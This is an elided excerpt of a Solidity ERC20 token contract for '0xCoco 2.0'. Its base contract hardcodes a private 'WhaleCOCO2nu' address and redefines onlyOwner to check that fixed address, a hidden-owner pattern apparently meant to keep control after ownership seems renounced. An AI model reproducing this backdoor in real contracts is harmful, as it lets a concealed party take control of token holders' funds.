...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public COCO2nuwebsite = "https://COCO2.com/";
    string public COCO2nuADDRESS = "0x2d479aD5b9CB2c9B28068eb3bCB0500Ed05cFb57";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleCOCO2nu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleCOCO2nu = 0x2d479aD5b9CB2c9B28068eb3bCB0500Ed05cFb57;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getCOCO2nuwebsite() public view returns (string memory) {
        return COCO2nuwebsite;
    } 


               function getCOCO2nuADDRESS() public view returns (string memory) {
        return COCO2nuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleCOCO2nu);
        _;
    }    
    function _approve(
        address owner,
...
contract COCO2 is ERC20, Ownable {
    constructor () ERC20("0xCoco 2.0", "COCO2.0") 
    {    
        firstBlock(msg.sender, 100_000000000000 * (10 ** 9));
    }
}